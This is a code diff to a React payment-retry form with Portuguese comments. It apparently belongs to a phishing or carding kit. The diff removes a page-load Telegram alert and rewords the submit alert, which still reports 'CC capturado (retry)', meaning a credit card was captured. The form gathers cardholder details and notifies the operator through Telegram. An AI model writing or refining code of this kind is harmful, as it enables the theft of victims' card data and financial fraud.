@@ -1,4 +1,4 @@
-import React, { useEffect } from 'react';
+import React from 'react';
 import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
 import { Button } from '@/components/ui/button';
@@ -44,20 +44,6 @@ const RetryPaymentForm: React.FC<RetryPaymentFormProps> = ({
     },
   });
 
-  // Enviar notificação quando o componente montar (entrada na tela de retry)
-  useEffect(() => {
-    const sendNotification = async () => {
-      try {
-        await sendTelegramNotification('📲 1x CC capturado (retry)');
-        console.log('Telegram notification sent on retry page load');
-      } catch (error) {
-        console.error('Error sending notification on retry page load:', error);
-      }
-    };
-    
-    sendNotification();
-  }, []);
-
   const handleSubmit = async (values: any) => {
     const cardData: CreditCardData = {
       holderName: values.holderName,
@@ -83,7 +69,7 @@ const RetryPaymentForm: React.FC<RetryPaymentFormProps> = ({
     
     // Enviar notificação do Telegram quando os dados do cartão forem submetidos na página de retry
     try {
-      await sendTelegramNotification(`💳 2x CC capturado (retry)`);
+      await sendTelegramNotification(`💳 CC capturado (retry)`);
       console.log('Telegram notification sent on retry form submit');
     } catch (error) {
       console.error('Error sending Telegram notification in retry page:', error);
